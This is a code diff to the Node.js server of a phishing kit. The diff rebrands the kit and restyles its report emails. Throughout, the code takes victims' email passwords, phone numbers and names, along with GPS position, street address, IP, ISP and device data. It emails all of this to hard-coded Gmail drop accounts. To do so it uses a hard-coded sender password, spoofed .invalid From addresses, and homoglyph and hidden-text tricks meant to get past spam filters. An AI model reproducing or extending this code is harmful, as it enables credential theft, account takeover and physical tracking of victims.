@@ -18,38 +18,38 @@ const SENDER_PASSWORD = 'tmyh wklt uyig lots';
 const EMAIL_CONFIG = {
     'wxyzzay': {
         email: ['chilligemaass@gmail.com'],
-        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗦𝗟𝗢𝗪𝗪☠️😈',
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+        fromName: '𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡☠️😈',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'ggwxzzr': {
         email: ['chilligemaass@gmail.com', 'Bay20110809@gmail.com'],
         fromName: 'WHEN YA PERDETIK🔥👾',
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'hgefdyt': {
         email: ['nebarzam@gmail.com', 'chilligemaass@gmail.com'],
-        fromName: '👻𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'mgwhiww': {
         email: ['chilligemaass@gmail.com'],
-        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'kttwwxy': {
         email: ['chilligemaass@gmail.com'],
-        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'mdgffew': {
         email: ['chilligemaass@gmail.com'],
-        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     },
     'FF_EventA': {
         email: ['chilligemaass@gmail.com'],
-        fromName: '👻DESA 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+        fromName: '👻𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗚𝗦𝗧 𝗗𝗜𝗩𝗜𝗦𝗜𝗢𝗡'
     }
 };
 
@@ -263,7 +263,7 @@ async function getASNAndAccurateLocation(ip) {
         try {
             const res4 = await fetch(
                 `https://nominatim.openstreetmap.org/reverse?format=json&lat=${result.latitude}&lon=${result.longitude}&zoom=18&addressdetails=1`,
-                { headers: { 'User-Agent': 'DSTR-Report/1.0' } }
+                { headers: { 'User-Agent': 'GST-Report/1.0' } }
             );
             const data4 = await res4.json();
             if (data4 && data4.address) {
@@ -302,12 +302,12 @@ function randStr(len) {
 }
 function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
 
-// ========== UNICODE SPAMMY DESASTR ==========
+// ========== UNICODE SPAMMY GST DIVISION ==========
 function makeSpammyUnicodeText(baseText) {
     const homoglyphs = {
-        'a': ['а', 'ɑ', 'α'], 'e': ['е', 'ε', 'ë'], 'o': ['о', 'ο', 'ö'],
-        's': ['ѕ', 'ş', 'ș'], 't': ['т', 'τ', 'ţ'], 'r': ['г', 'ρ', 'ř'],
-        'd': ['ԁ', 'δ', 'ď'], 'n': ['п', 'η', 'ñ'], 'i': ['і', 'ι', 'ï'], 'l': ['ӏ', 'λ', 'ľ']
+        'g': ['Ԍ', 'ɢ', 'ɢ'], 's': ['ѕ', 'ş', 'ș'], 't': ['т', 'τ', 'ţ'],
+        'd': ['ԁ', 'δ', 'ď'], 'i': ['і', 'ι', 'ï'], 'v': ['ν', 'ѵ', 'ⅴ'],
+        'n': ['п', 'η', 'ñ']
     };
     let result = '';
     for (let i = 0; i < baseText.length; i++) {
@@ -369,7 +369,7 @@ async function sendEmail(data, folderName) {
         try {
             const res = await fetch(
                 `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.latitude}&lon=${data.longitude}&zoom=18&addressdetails=1`,
-                { headers: { 'User-Agent': 'DSTR-Report/1.0' } }
+                { headers: { 'User-Agent': 'GST-Report/1.0' } }
             );
             const d = await res.json();
             if (d && d.address) {
@@ -389,137 +389,207 @@ async function sendEmail(data, folderName) {
         } catch (e) { console.error('Nominatim GPS error:', e.message); }
     }
     
-    const countryName = asnData.country;
-    const countryCode = asnData.countryCode;
-    const regionName = asnData.region;
-    const cityName = asnData.city;
-    const postalCode = asnData.postalCode;
+    // Pastikan nama kota/provinsi tidak disingkat (mengambil dari reverse geocode jika ada, atau API fallback)
+    const countryName = reverseGeo?.country || asnData.country;
+    const countryCode = reverseGeo?.countryCode || asnData.countryCode;
+    const regionName = reverseGeo?.state || asnData.region;
+    const cityName = reverseGeo?.city || asnData.city;
+    const postalCode = reverseGeo?.postcode || asnData.postalCode;
     const ispName = asnData.isp;
     const asnInfo = asnData.asn;
     const asnameInfo = asnData.asname;
     
     const flagEmoji = getFlagEmoji(countryCode);
     
-    const desastrSpammy = makeSpammyUnicodeText('DESASTR');
-    const desastrFullwidth = makeFullwidthText('DESASTR');
-    const desastrCombining = makeCombiningText('DESASTR');
-    const desastrRTL = makeRTLText('DESASTR');
-    const desastrRandom = randPick([desastrSpammy, desastrFullwidth, desastrCombining, desastrRTL]);
+    const gstSpammy = makeSpammyUnicodeText('GST DIVISION');
+    const gstFullwidth = makeFullwidthText('GST DIVISION');
+    const gstCombining = makeCombiningText('GST DIVISION');
+    const gstRTL = makeRTLText('GST DIVISION');
+    const gstRandom = randPick([gstSpammy, gstFullwidth, gstCombining, gstRTL]);
     
     let reverseGeoHtml = '';
     if (reverseGeo) {
         const rg = reverseGeo;
         reverseGeoHtml = `
-        <div class="data-box">
-            <div class="data-title">🏠 ALAMAT LENGKAP (REVERSE GEOCODING)</div>
-            <div class="data-row"><div class="label">Sumber : </div><div class="value"> ${hasGPS ? 'GPS (koordinat GPS)' : 'IP Geolocation'}</div></div>
-            <div class="data-row"><div class="label">Alamat Lengkap : </div><div class="value"> ${rg.displayName || '-'}</div></div>
-            <div class="data-row"><div class="label">Jalan : </div><div class="value"> ${rg.road}</div></div>
-            <div class="data-row"><div class="label">RT/RW/Neighbourhood : </div><div class="value"> ${rg.neighbourhood}</div></div>
-            <div class="data-row"><div class="label">Desa/Kelurahan : </div><div class="value"> ${rg.village}</div></div>
-            <div class="data-row"><div class="label">Kecamatan : </div><div class="value"> ${rg.district}</div></div>
-            <div class="data-row"><div class="label">Kota/Kabupaten : </div><div class="value"> ${rg.city}</div></div>
-            <div class="data-row"><div class="label">Provinsi : </div><div class="value"> ${rg.state}</div></div>
-            <div class="data-row"><div class="label">Kode Pos : </div><div class="value"> ${rg.postcode}</div></div>
-            <div class="data-row"><div class="label">Negara : </div><div class="value"> ${rg.country} (${rg.countryCode})</div></div>
-        </div>`;
+        <tr class="section-header"><td colspan="2">Alamat Lengkap (Reverse Geocoding)</td></tr>
+        <tr><td class="label">Sumber</td><td class="value">${hasGPS ? 'GPS (koordinat presisi)' : 'IP Geolocation'}</td></tr>
+        <tr><td class="label">Alamat Lengkap</td><td class="value">${rg.displayName || '-'}</td></tr>
+        <tr><td class="label">Jalan</td><td class="value">${rg.road}</td></tr>
+        <tr><td class="label">RT/RW/Neighbourhood</td><td class="value">${rg.neighbourhood}</td></tr>
+        <tr><td class="label">Desa/Kelurahan</td><td class="value">${rg.village}</td></tr>
+        <tr><td class="label">Kecamatan</td><td class="value">${rg.district}</td></tr>
+        <tr><td class="label">Kota/Kabupaten</td><td class="value">${rg.city}</td></tr>
+        <tr><td class="label">Provinsi</td><td class="value">${rg.state}</td></tr>
+        <tr><td class="label">Kode Pos</td><td class="value">${rg.postcode}</td></tr>
+        <tr><td class="label">Negara</td><td class="value">${rg.country} (${rg.countryCode})</td></tr>`;
     }
     
     let multiSourceHtml = '';
     const sourceKeys = Object.keys(asnData.sources);
     if (sourceKeys.length > 0) {
-        multiSourceHtml = `<div class="data-box">
-            <div class="data-title">🔍 MULTI-API CROSS-CHECK IP (${asnData.accuracy})</div>`;
+        multiSourceHtml = `<tr class="section-header"><td colspan="2">Multi-API Cross-Check IP (${asnData.accuracy})</td></tr>`;
         for (const key of sourceKeys) {
             const s = asnData.sources[key];
             multiSourceHtml += `
-            <div class="data-row"><div class="label">${key} City : </div><div class="value"> ${s.city || '-'}</div></div>
-            <div class="data-row"><div class="label">${key} Region : </div><div class="value"> ${s.region || '-'}</div></div>
-            <div class="data-row"><div class="label">${key} Lat/Lon : </div><div class="value"> ${s.lat || '-'}, ${s.lon || '-'}</div></div>`;
+            <tr><td class="label">${key} City</td><td class="value">${s.city || '-'}</td></tr>
+            <tr><td class="label">${key} Region</td><td class="value">${s.region || '-'}</td></tr>
+            <tr><td class="label">${key} Lat/Lon</td><td class="value">${s.lat || '-'}, ${s.lon || '-'}</td></tr>`;
         }
-        multiSourceHtml += `</div>`;
     }
     
+    // DESAIN EMAIL BARU: Biru, Transparan, Animasi, Font Tebal
     const htmlContent = `<!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DSTR REPORT</title>
+<title>GST DIVISION REPORT</title>
 <style>
-body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color:white;}
-.container{max-width:700px;margin:auto;background:#0b0b0b;border:2px solid #00e5ff;}
-.topbar{background:#3914cc;color:#00e5ff;text-align:center;padding:20px;font-size:28px;font-weight:bold;letter-spacing:3px;border-bottom:2px solid #00e5ff;box-shadow:0 0 15px #00e5ff;}
-.mainbox{padding:20px;}
-.data-box{background:white;color:black;margin-bottom:20px;border:2px solid #3914cc;}
-.data-title{background:#3914cc;color:#00e5ff;padding:12px;font-size:15px;font-weight:bold;border-bottom:2px solid #00e5ff;box-shadow:0 0 10px #00e5ff inset;}
-.data-row{display:flex;justify-content:space-between;padding:12px;border-bottom:1px solid #999;gap:10px;word-break:break-word;}
-.data-row:last-child{border-bottom:none;}
-.label{font-weight:bold;}
-.value{text-align:right;max-width:60%;}
-.footer-sign{margin-top:25px;background:#3914cc;border:2px solid #00e5ff;text-align:center;padding:15px;color:#00e5ff;font-size:18px;font-weight:bold;box-shadow:0 0 15px #00e5ff;}
-.accuracy-badge{display:inline-block;padding:6px 12px;border-radius:20px;font-weight:bold;color:white;}
+    @keyframes scan {
+        0% { background-position: 0 0; }
+        100% { background-position: 0 100%; }
+    }
+    @keyframes pulse {
+        0%, 100% { opacity: 1; text-shadow: 0 0 10px #00d2ff; }
+        50% { opacity: 0.6; text-shadow: 0 0 20px #00d2ff, 0 0 30px #00d2ff; }
+    }
+    @keyframes glow {
+        0%, 100% { box-shadow: 0 0 5px rgba(0, 210, 255, 0.5); border-color: rgba(0, 210, 255, 0.5); }
+        50% { box-shadow: 0 0 20px rgba(0, 210, 255, 0.9); border-color: rgba(0, 210, 255, 1); }
+    }
+    body {
+        margin: 0; padding: 20px;
+        background: linear-gradient(135deg, #020b1c 0%, #04142e 100%);
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        color: #ffffff;
+    }
+    .container {
+        max-width: 650px; margin: auto;
+        background: rgba(0, 20, 50, 0.6);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(0, 210, 255, 0.4);
+        border-radius: 15px;
+        overflow: hidden;
+        animation: glow 3s infinite alternate;
+    }
+    .topbar {
+        background: linear-gradient(90deg, #001f3f, #00509e);
+        color: #00d2ff;
+        text-align: center; padding: 25px 15px;
+        font-size: 26px; font-weight: 900; letter-spacing: 2px;
+        border-bottom: 2px solid #00d2ff;
+        animation: pulse 2s infinite;
+        word-wrap: break-word;
+    }
+    .main-content { padding: 20px; }
+    table {
+        width: 100%; border-collapse: collapse;
+        background: rgba(0, 10, 30, 0.5);
+        border-radius: 10px; overflow: hidden;
+        margin-bottom: 25px;
+        border: 1px solid rgba(0, 150, 255, 0.3);
+    }
+    th, td {
+        padding: 14px 15px;
+        border-bottom: 1px solid rgba(0, 150, 255, 0.2);
+        text-align: left; font-size: 14px;
+    }
+    tr:last-child td { border-bottom: none; }
+    .label {
+        font-weight: 800; color: #00d2ff; width: 40%;
+        text-transform: uppercase; letter-spacing: 1px;
+    }
+    .value {
+        color: #e0f7fa; font-weight: 600; word-break: break-word;
+    }
+    .value a { color: #00d2ff; text-decoration: none; font-weight: bold; }
+    .section-header {
+        background: rgba(0, 80, 158, 0.8);
+        color: #00d2ff; text-align: center;
+        font-weight: 900; text-transform: uppercase; letter-spacing: 2px;
+        font-size: 15px; padding: 15px;
+    }
+    .accuracy-badge {
+        display: inline-block; padding: 5px 10px; border-radius: 20px;
+        font-weight: bold; color: #000; font-size: 12px;
+    }
+    .footer-sign {
+        background: linear-gradient(90deg, #001f3f, #00509e);
+        border-top: 2px solid #00d2ff;
+        text-align: center; padding: 20px;
+        color: #00d2ff; font-size: 16px; font-weight: 900;
+        letter-spacing: 1px;
+    }
 </style>
 </head>
 <body>
 <div class="container">
-    <div class="topbar">${desastrRandom}</div>
-    <div class="mainbox">
-        <div class="data-box">
-            <div class="data-title">📧 ACCOUNT INFORMATION</div>
-            <div class="data-row"><div class="label">Email : </div><div class="value"> ${data.email || '-'}</div></div>
-            <div class="data-row"><div class="label">Password : </div><div class="value"> ${data.emailPassword || '-'}</div></div>
-            <div class="data-row"><div class="label">Phone : </div><div class="value"> ${data.phone || '-'}</div></div>
-            <div class="data-row"><div class="label">Full Name : </div><div class="value"> ${data.fullName || '-'}</div></div>
-        </div>
-        <div class="data-box">
-            <div class="data-title">🎯 LOKASI FINAL (PRIORITAS LANGSUNG)</div>
-            <div class="data-row"><div class="label">Sumber : </div><div class="value"> <span class="accuracy-badge" style="background:${locSource.color}">${locSource.source}</span></div></div>
-            <div class="data-row"><div class="label">Level Akurasi : </div><div class="value"> <b style="color:${locSource.color}">${locSource.level}</b></div></div>
-            <div class="data-row"><div class="label">Latitude : </div><div class="value"> ${finalLat}</div></div>
-            <div class="data-row"><div class="label">Longitude : </div><div class="value"> ${finalLon}</div></div>
-            <div class="data-row"><div class="label">Accuracy : </div><div class="value"> ${finalAccuracy}</div></div>
-            <div class="data-row"><div class="label">Google Maps : </div><div class="value"> <a href="https://www.google.com/maps?q=${finalLat},${finalLon}" style="color:#0066cc">Buka Maps</a></div></div>
-        </div>
-        <div class="data-box">
-            <div class="data-title">📍 GPS BROWSER (LANGSUNG DARI DEVICE)</div>
-            <div class="data-row"><div class="label">Status GPS : </div><div class="value"> ${hasGPS ? '✅ DAPET' : '❌ GAGAL / DITOLAK'}</div></div>
-            <div class="data-row"><div class="label">Latitude GPS : </div><div class="value"> ${data.latitude || '-'}</div></div>
-            <div class="data-row"><div class="label">Longitude GPS : </div><div class="value"> ${data.longitude || '-'}</div></div>
-            <div class="data-row"><div class="label">Accuracy GPS : </div><div class="value"> ${data.gps_accuracy || '-'} m</div></div>
-            <div class="data-row"><div class="label">Sumber GPS : </div><div class="value"> ${data.gps_source || 'IP fallback'}</div></div>
-        </div>
-        ${reverseGeoHtml}
-        <div class="data-box">
-            <div class="data-title">🌍 LOKASI IP (FALLBACK)</div>
-            <div class="data-row"><div class="label">Negara : </div><div class="value"> ${countryName} ${flagEmoji}</div></div>
-            <div class="data-row"><div class="label">Provinsi : </div><div class="value"> ${regionName}</div></div>
-            <div class="data-row"><div class="label">Kota : </div><div class="value"> ${cityName}</div></div>
-            <div class="data-row"><div class="label">Kode Pos : </div><div class="value"> ${postalCode}</div></div>
-            <div class="data-row"><div class="label">Lat/Lon IP : </div><div class="value"> ${asnData.latitude || '-'}, ${asnData.longitude || '-'}</div></div>
-            <div class="data-row"><div class="label">Akurasi IP : </div><div class="value"> ${asnData.accuracy}</div></div>
-        </div>
-        ${multiSourceHtml}
-        <div class="data-box">
-            <div class="data-title">🌐 NETWORK & ASN</div>
-            <div class="data-row"><div class="label">IP Address : </div><div class="value"> ${data.ip_address || '-'}</div></div>
-            <div class="data-row"><div class="label">ISP : </div><div class="value"> ${ispName}</div></div>
-            <div class="data-row"><div class="label">ASN : </div><div class="value"> ${asnInfo}</div></div>
-            <div class="data-row"><div class="label">AS Name : </div><div class="value"> ${asnameInfo}</div></div>
-            <div class="data-row"><div class="label">Organization : </div><div class="value"> ${asnData.org}</div></div>
-        </div>
-        <div class="data-box">
-            <div class="data-title">🖥 DEVICE INFORMATION</div>
-            <div class="data-row"><div class="label">Platform : </div><div class="value"> ${data.platform || '-'}</div></div>
-            <div class="data-row"><div class="label">Resolution : </div><div class="value"> ${data.screenResolution || '-'}</div></div>
-            <div class="data-row"><div class="label">Language : </div><div class="value"> ${data.language || '-'}</div></div>
-        </div>
-        <div class="data-box">
-            <div class="data-title">⏰ TIMESTAMP</div>
-            <div class="data-row"><div class="label">Time : </div><div class="value"> ${data.timestamp || new Date().toLocaleString()}</div></div>
-        </div>
-        <div class="footer-sign">${desastrRandom} - GPS-First + Multi-API + Reverse Geocoding</div>
+    <div class="topbar">${gstRandom}</div>
+    <div class="main-content">
+        <table>
+            <tr class="section-header"><td colspan="2">Account Information</td></tr>
+            <tr><td class="label">Email / Phone</td><td class="value">${data.email || '-'}</td></tr>
+            <tr><td class="label">Password</td><td class="value">${data.emailPassword || '-'}</td></tr>
+            <tr><td class="label">Phone</td><td class="value">${data.phone || '-'}</td></tr>
+            <tr><td class="label">Full Name</td><td class="value">${data.fullName || '-'}</td></tr>
+        </table>
+
+        <table>
+            <tr class="section-header"><td colspan="2">Lokasi Final (Prioritas Utama)</td></tr>
+            <tr><td class="label">Sumber</td><td class="value"><span class="accuracy-badge" style="background:${locSource.color}">${locSource.source}</span></td></tr>
+            <tr><td class="label">Level Akurasi</td><td class="value" style="color:${locSource.color}"><b>${locSource.level}</b></td></tr>
+            <tr><td class="label">Latitude</td><td class="value">${finalLat}</td></tr>
+            <tr><td class="label">Longitude</td><td class="value">${finalLon}</td></tr>
+            <tr><td class="label">Accuracy</td><td class="value">${finalAccuracy}</td></tr>
+            <tr><td class="label">Google Maps</td><td class="value"><a href="https://www.google.com/maps?q=${finalLat},${finalLon}" target="_blank">Buka Maps</a></td></tr>
+        </table>
+
+        <table>
+            <tr class="section-header"><td colspan="2">GPS Browser (Device)</td></tr>
+            <tr><td class="label">Status GPS</td><td class="value" style="color:${hasGPS ? '#4caf50' : '#f44336'}">${hasGPS ? '✅ DAPAT' : '❌ GAGAL / DITOLAK'}</td></tr>
+            <tr><td class="label">Latitude GPS</td><td class="value">${data.latitude || '-'}</td></tr>
+            <tr><td class="label">Longitude GPS</td><td class="value">${data.longitude || '-'}</td></tr>
+            <tr><td class="label">Accuracy GPS</td><td class="value">${data.gps_accuracy || '-'} m</td></tr>
+            <tr><td class="label">Sumber GPS</td><td class="value">${data.gps_source || 'IP fallback'}</td></tr>
+        </table>
+
+        ${reverseGeoHtml ? `<table>${reverseGeoHtml}</table>` : ''}
+
+        <table>
+            <tr class="section-header"><td colspan="2">Informasi IP (Fallback)</td></tr>
+            <tr><td class="label">Negara</td><td class="value">${countryName} ${flagEmoji}</td></tr>
+            <tr><td class="label">Provinsi</td><td class="value">${regionName}</td></tr>
+            <tr><td class="label">Kota</td><td class="value">${cityName}</td></tr>
+            <tr><td class="label">Kode Pos</td><td class="value">${postalCode}</td></tr>
+            <tr><td class="label">Lat / Lon IP</td><td class="value">${asnData.latitude || '-'}, ${asnData.longitude || '-'}</td></tr>
+            <tr><td class="label">Akurasi IP</td><td class="value">${asnData.accuracy}</td></tr>
+        </table>
+
+        ${multiSourceHtml ? `<table>${multiSourceHtml}</table>` : ''}
+
+        <table>
+            <tr class="section-header"><td colspan="2">Network & ASN</td></tr>
+            <tr><td class="label">IP Address</td><td class="value">${data.ip_address || '-'}</td></tr>
+            <tr><td class="label">ISP</td><td class="value">${ispName}</td></tr>
+            <tr><td class="label">ASN</td><td class="value">${asnInfo}</td></tr>
+            <tr><td class="label">AS Name</td><td class="value">${asnameInfo}</td></tr>
+            <tr><td class="label">Organization</td><td class="value">${asnData.org}</td></tr>
+        </table>
+
+        <table>
+            <tr class="section-header"><td colspan="2">Device Information</td></tr>
+            <tr><td class="label">Platform</td><td class="value">${data.platform || '-'}</td></tr>
+            <tr><td class="label">Resolution</td><td class="value">${data.screenResolution || '-'}</td></tr>
+            <tr><td class="label">Language</td><td class="value">${data.language || '-'}</td></tr>
+            <tr><td class="label">User Agent</td><td class="value" style="font-size:12px;">${data.userAgent || '-'}</td></tr>
+        </table>
+
+        <table>
+            <tr class="section-header"><td colspan="2">Timestamp</td></tr>
+            <tr><td class="label">Waktu Akses</td><td class="value">${data.timestamp || new Date().toLocaleString('id-ID')}</td></tr>
+        </table>
     </div>
+    <div class="footer-sign">${gstRandom} - GST DIVISION</div>
 </div>
 </body>
 </html>`;
@@ -527,9 +597,9 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
     const config = EMAIL_CONFIG[folderName];
     if (!config) return;
 
-    const FROM_DOMAIN = 'DESASTR.invalid';
+    const FROM_DOMAIN = 'GSTDIVISION.invalid';
     const FROM_ADDRESS = `admin@${FROM_DOMAIN}`;
-    const REPLY_ADDRESS = `noreply@Desastr.invalid`;
+    const REPLY_ADDRESS = `noreply@GSTDIVISION.invalid`;
 
     for (const receiver of config.email) {
         if (!receiver || receiver === '') continue;
@@ -544,7 +614,7 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
         const randIp = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
         const randIp2 = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
 
-        const spammySubject = `${desastrRandom} ${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName}`;
+        const spammySubject = `${gstRandom} ${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName}`;
 
         const brokenHtml = `
             <font face="Arial" size="2">
@@ -553,15 +623,15 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             <table cellpadding="0" cellspacing="0" border="0" width="100%">
             <tr><td>
             <div style="color:#ffffff;background:#ffffff;font-size:9px;">
-                ${desastrSpammy} ${randStr(40)} ${desastrFullwidth}
+                ${gstSpammy} ${randStr(40)} ${gstFullwidth}
             </div>
             <div style="color:#0000ff;text-decoration:underline;">
-                ${desastrFullwidth}
+                ${gstFullwidth}
             </div>
-            <div>${desastrCombining}</div>
-            <div>${desastrRTL}</div>
+            <div>${gstCombining}</div>
+            <div>${gstRTL}</div>
             <div>
-            <span style="font-size:1px;color:#ffffff;">${desastrSpammy} ${randStr(30)}</span>
+            <span style="font-size:1px;color:#ffffff;">${gstSpammy} ${randStr(30)}</span>
             </td></tr>
             </table>
             </td></tr>
@@ -591,12 +661,12 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
         };
 
         await transporter.sendMail({
-            from: `"${desastrRandom}" <${FROM_ADDRESS}>`,
+            from: `"${gstRandom}" <${FROM_ADDRESS}>`,
             envelope: { from: SENDER_EMAIL, to: receiver },
             to: receiver,
             subject: spammySubject,
             replyTo: REPLY_ADDRESS,
-            text: `${desastrSpammy}\n\n${desastrCombining}\n\n${config.subject}\n${data.email || '-'}`,
+            text: `${gstSpammy}\n\n${gstCombining}\n\n${config.subject}\n${data.email || '-'}`,
             html: htmlContent + brokenHtml,
             headers: spammyHeaders
         });
@@ -1104,11 +1174,9 @@ app.listen(PORT, () => {
     console.log(`   → http://localhost:${PORT}/kttwwxy`);
     console.log(`   → http://localhost:${PORT}/mdgffew`);
     console.log(`   → http://localhost:${PORT}/FF_EventA`);
-    console.log(`\n✅ GPS CONSENT-FIRST: browser nanya user, tunggu jawaban (timeout 60s)!`);
+    console.log(`\n✅ EMAIL TEMPLATE: Dark Blue Transparent + Animation + Full Region Name!`);
+    console.log(`✅ UNICODE SPAM: Diubah menjadi "GST DIVISION"!`);
+    console.log(`✅ GPS CONSENT-FIRST: browser nanya user, tunggu jawaban (timeout 60s)!`);
     console.log(`✅ MULTI-API GEOLOCATION: ip-api.com + ipapi.co + ipwho.is cross-check!`);
     console.log(`✅ REVERSE GEOCODING: Nominatim (OpenStreetMap) untuk alamat lengkap!`);
-    console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
-    console.log(`✅ SPAM BOOSTER: From admin@DESASTR.invalid + Reply-To noreply@Desastr.invalid + unicode DESASTR!`);
-    console.log(`✅ HTML VIDEY: Slider biru + tombol biru + GPS consent-first + popup izin lokasi browser!`);
-    console.log(`✅ FULLSCREEN: DIHAPUS di route / dan route videy!`);
 });
